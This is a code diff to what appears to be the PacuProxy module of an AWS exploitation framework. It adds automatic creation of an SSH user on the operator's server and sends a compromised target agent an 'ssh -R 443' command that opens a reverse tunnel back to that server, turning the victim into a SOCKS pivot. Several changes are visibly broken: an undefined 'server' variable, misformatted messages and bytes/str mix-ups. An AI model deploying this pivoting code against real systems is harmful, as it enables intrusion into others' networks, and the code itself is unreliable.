@@ -329,7 +329,6 @@ def start_proxy(database):
 
 # Create the proxy threads
 def create_workers(database):
-    server = PacuProxy()
     server.prepare_server(database)
     for _ in range(2):
         t = threading.Thread(target=work, args=(database,), daemon=True)
@@ -349,13 +348,60 @@ def work(database):
         if x == 5:
             break # Shutdown listener called
     queue.task_done()
-    return global_config
+    return
 
 # Fill the queue with jobs
 def create_jobs():
     for x in [1, 2]: # Job numbers
         queue.put(x)
     return
+
+
+def get_ssh_user(ssh_user, database):
+    if ssh_user is None or 'UserName' not in ssh_user or ssh_user['UserName'] is None or ssh_user['UserName'] == '':
+        new_user = util.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ', database)
+
+        if new_user == 'y':
+            # Create a random username that is randomly 3-9 characters
+            username = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
+            command = 'adduser --shell /bin/false --disabled-password {}'.format(username)
+            util.print('Running command: {}'.format(command))
+            try:
+                subprocess.run(command.split(' '), shell=True)
+                try:
+                    user_id = subprocess.check_output('id -u {}'.format(username), shell=True)
+                    if 'no such user' in user_id:
+                        util.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
+                        return None
+                    util.print('User {} created successfully!', database)
+                    return {'UserName': username}
+                except Exception as e:
+                    util.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
+                    return None
+            except:
+                util.print('Failed to create user...', database)
+                return None
+        else:
+            return None
+    else:
+        try:
+            user_id = subprocess.check_output('id -u {}'.format(ssh_user['UserName']), shell=True)
+            if 'no such user' in user_id:
+                util.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
+                new_user = util.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+                if new_user == 'y':
+                    return get_ssh_user(None, database)
+                else:
+                    return None
+            else:
+                return ssh_user
+        except Exception as e:
+            util.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
+            new_user = util.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+            if new_user == 'y':
+                return get_ssh_user(None, database)
+            else:
+                return None
 
 
 def parse_command(command, database):
@@ -438,7 +484,16 @@ def parse_command(command, database):
                         proxy_data['Target'] = None
                     else:
                         print('Setting proxy target to agent {}...'.format(cmd[2]))
+
+                        proxy_data['SSHUser'] = get_ssh_user(proxy_data['SSHUser'], database)
+                        if proxy_data['SSHUser'] is None:
+                            util.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
+                            session.update(database, Proxy=proxy_data)
+                            return
+
                         proxy_data['Target'] = int(cmd[2])
+                        connect_back_cmd = 'ssh -R 443 {}@{}'.format(proxy_data['SSHUser']['UserName'], proxy_data['IP'])
+                        global_config['Proxy'].run_cmd(proxy_data['Target'], global_config['Proxy'].all_connections[int(cmd[2])], connect_back_cmd)
                 except:
                     print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]))
             else:
